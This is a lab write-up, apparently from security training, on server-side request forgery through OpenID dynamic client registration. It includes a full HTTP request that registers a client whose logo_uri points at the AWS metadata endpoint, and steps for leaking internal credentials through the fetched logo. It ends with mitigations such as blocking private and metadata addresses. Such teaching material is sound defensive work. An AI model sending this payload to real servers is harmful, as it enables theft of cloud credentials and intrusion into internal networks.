# Lab 5: SSRF via OpenID dynamic client registration

## Description
The OpenID Provider supports dynamic client registration, allowing unauthenticated client registration via an endpoint. By injecting an internal target address into client metadata parameters (such as `logo_uri` or `jwks_uri`), an attacker can cause the OAuth server to issue an outbound request to internal systems, leading to Server-Side Request Forgery (SSRF).

## Exploitation Steps

1. **Discover OpenID Configuration:**
   - Request the OpenID configuration endpoint:
     `GET /.well-known/openid-configuration HTTP/1.1`
   - Identify the dynamic registration endpoint parameter:
     `"registration_endpoint": "https://oauth-server.net/connect/register"`

2. **Register Malicious OAuth Client:**
   - Send a `POST` request to register a client with a `logo_uri` pointing to the internal resource (e.g., AWS Cloud Metadata IP `169.254.169.254`):
     ```http
     POST /connect/register HTTP/1.1
     Host: oauth-server.net
     Content-Type: application/json

     {
       "application_type": "web",
       "redirect_uris": ["[https://exploit-server.net/callback](https://exploit-server.net/callback)"],
       "client_name": "Exploit App",
       "logo_uri": "[http://169.254.169.254/latest/meta-data/](http://169.254.169.254/latest/meta-data/)"
     }
     ```
   - Note down the generated `client_id` in the server's response.

3. **Trigger SSRF Connection:**
   - Request the resource or client profile page that attempts to fetch or render the client logo:
     ```http
     GET /client/YOUR_CLIENT_ID/logo HTTP/1.1
     Host: oauth-server.net
     ```

4. **Exfiltrate Internal Data:**
   - Observe the response from the server containing internal AWS metadata credentials or restricted internal network responses leaked via the fetched logo content.

## Mitigation Strategies

- **Disable Unnecessary Dynamic Registration:** Turn off unauthenticated OAuth dynamic client registration unless explicitly needed.
- **URL Sanitization & Private Subnet Blocking:** Validate all supplied URIs (`logo_uri`, `jwks_uri`) on the server side to block loopback (`127.0.0.1`), private RFC 1918 subnets, and cloud metadata endpoints (`169.254.169.254`).
- **Egress Network Controls:** Configure firewalls and egress proxies on application servers to restrict outbound HTTP/HTTPS connections strictly to explicit external domains.
